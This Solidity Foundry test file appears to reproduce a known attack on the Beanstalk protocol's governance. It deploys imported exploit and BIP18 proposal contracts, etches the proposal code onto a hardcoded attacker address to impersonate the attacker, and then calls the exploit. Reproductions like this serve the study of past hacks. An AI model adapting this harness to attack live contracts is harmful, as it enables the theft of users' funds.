// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "../exploit/BeanExploit.sol";
import "../exploit/BIP18.sol";

// Hack occured  @ Block Number => 14602789

contract BeanExploitTest is Test {
    BeanExploit bean;
    BIP18 bip18;

    function setUp() public {}

    function fixtures() public {
        // Deploy exploit contract.
        bean = new BeanExploit();
        vm.label(address(this), "Outer Test");
        vm.label(address(bean), "BeanExploit");

        // Deploy proposal
        bip18 = new BIP18(address(bean));

        /** 
            Replace the attacker's BIP18 proposal with our BIP18
            on the same address to save some steps.
        */
        vm.etch(
            0xE5eCF73603D98A0128F05ed30506ac7A663dBb69,
            getCodeIt(address(bip18))
        );
    }

    function test() public {
        /**
            We are impersonating te attacker which reduces steps to voting.
        */
        fixtures();
        bean.exploit();
    }

    // ----------------- Util Function -----------------
    function getCodeIt(address who)
        internal
        view
        returns (bytes memory o_code)
    {
        /// @solidity memory-safe-assembly
        assembly {
            // retrieve the size of the code, this needs assembly
            let size := extcodesize(who)
            // allocate output byte array - this could also be done without assembly
            // by using o_code = new bytes(size)
            o_code := mload(0x40)
            // new "memory end" including padding
            mstore(
                0x40,
                add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f)))
            )
            // store length in memory
            mstore(o_code, size)
            // actually retrieve the code, this needs assembly
            extcodecopy(who, add(o_code, 0x20), 0, size)
        }
    }
}
